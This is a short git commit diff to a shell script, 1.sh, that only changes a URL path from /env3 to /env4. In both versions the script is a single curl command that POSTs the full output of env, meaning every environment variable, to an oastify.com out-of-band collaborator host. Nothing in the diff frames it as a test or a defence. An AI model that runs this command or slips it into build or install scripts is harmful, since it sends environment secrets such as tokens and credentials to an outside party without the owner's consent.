bbc33eefc2da9c6a3ac75e060e3f0de314f6bbaa
w2h3 <118594933+w2h3@users.noreply.github.com>
2023-03-13 12:07:31 +0800

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-curl -X POST -d "$(env)" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/env3
+curl -X POST -d "$(env)" https://cq6e1r9ppa1w1mzjnd59f6vtfklb930rp.oastify.com/env4
